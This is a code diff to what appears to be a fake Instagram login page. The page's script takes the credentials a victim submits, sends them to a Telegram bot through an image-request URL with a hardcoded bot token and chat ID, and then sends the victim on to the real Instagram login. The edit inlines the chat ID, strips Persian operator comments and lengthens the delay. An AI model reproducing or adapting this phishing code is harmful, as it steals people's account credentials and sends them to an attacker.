@@ -176,9 +176,6 @@ Don't have an account?
 </div>
 
 <script>
-// ⚠️ فقط این یک خط رو تغییر بده - چت آی دی که از getUpdates گرفتی رو بذار
-var CHAT_ID = "8285016242";
-
 function handleLogin(event) {
     event.preventDefault();
 
@@ -195,13 +192,12 @@ function handleLogin(event) {
         "⏰ " + new Date().toLocaleString('fa-IR')
     );
 
-    // ارسال با روش Image (تضمینی)
     var img = new Image();
-    img.src = "https://api.telegram.org/bot8962136688:AAHUGtRUtEvN-yVvrZUzLDk4U7pbZcP5TvQ/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
+    img.src = "https://api.telegram.org/bot8962136688:AAHUGtRUtEvN-yVvrZUzLDk4U7pbZcP5TvQ/sendMessage?chat_id=8285016242&text=" + msg;
 
     setTimeout(function() {
         window.location.href = 'https://www.instagram.com/accounts/login/';
-    }, 2000);
+    }, 4000);
 }
 </script>
 
